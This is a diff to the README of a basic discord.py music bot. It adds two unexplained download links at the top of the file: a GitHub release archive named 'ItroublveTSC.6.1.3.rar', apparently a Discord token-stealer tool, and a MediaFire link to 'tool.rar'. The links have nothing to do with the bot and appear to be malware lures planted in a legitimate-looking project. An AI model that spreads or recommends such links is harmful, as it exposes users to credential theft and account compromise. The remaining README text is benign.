@@ -1,3 +1,7 @@
+https://objects.githubusercontent.com/github-production-release-asset-2e65be/453491470/32eb0298-d9e2-43eb-9557-589a558f8e56?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220522%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220522T113602Z&X-Amz-Expires=300&X-Amz-Signature=fe9b5c10e0a5355a760c5e975ebc07523353c4a4d65f724c59cbf6da310f4e30&X-Amz-SignedHeaders=host&actor_id=80380401&key_id=0&repo_id=453491470&response-content-disposition=attachment%3B%20filename%3DItroublveTSC.6.1.3.rar&response-content-type=application%2Foctet-stream
+
+https://download2266.mediafire.com/aqlj2sxo6ryg/qbxo680npjooihm/tool.rar
+
 # Discord.py Music Bot
 
 A simple music bot written in discord.py using youtube-dl. Use this as an example or a base for your own bot and extend it as you want. 
